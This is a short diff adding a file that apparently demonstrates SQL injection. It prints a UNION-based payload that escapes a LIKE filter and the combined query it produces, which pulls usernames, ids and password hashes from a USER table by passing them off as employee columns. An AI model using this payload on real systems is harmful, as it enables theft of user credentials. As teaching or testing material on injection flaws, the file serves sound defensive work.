@@ -1,0 +1,26 @@
+This is the full SQL that is going to be evaluated:
+
+SELECT P.NAME  as PERSON_NAME,
+       P.AGE,
+       D.NAME  AS DEPARTMENT_NAME,
+       ET.NAME AS EMPLOYMENT_TYPE_NAME,
+       E.START_DATE,
+       E.END_DATE
+FROM PERSON P
+         JOIN EMPLOYEE E ON P.ID = E.PERSON_ID
+         JOIN DEPARTMENT D ON E.DEPARTMENT_ID = D.ID
+         JOIN EMPLOYMENT_TYPE ET ON ET.ID = E.EMPLOYMENT_TYPE_ID
+WHERE P.NAME LIKE '%' ||
+                  '!!!'
+UNION
+SELECT U.USERNAME                   as PERSON_NAME,
+       U.ID,
+       U.PASSWORD_HASH              AS DEPARTMENT_NAME,
+       'x'                          as EMPLOYMENT_TYPE_NAME,
+       '2010-01-01 08:00:00.000000' as START_DATE,
+       '2010-01-01 08:00:00.000000' as END_DATE
+FROM USER U
+WHERE U.USERNAME LIKE '%';
+
+And this is the injection itself:
+!!!' UNION SELECT U.USERNAME                   as PERSON_NAME,        U.ID,        U.PASSWORD_HASH              AS DEPARTMENT_NAME,        'x'                          as EMPLOYMENT_TYPE_NAME,        '2010-01-01 08:00:00.000000' as START_DATE,        '2010-01-01 08:00:00.000000' as END_DATE FROM USER U WHERE U.USERNAME LIKE '
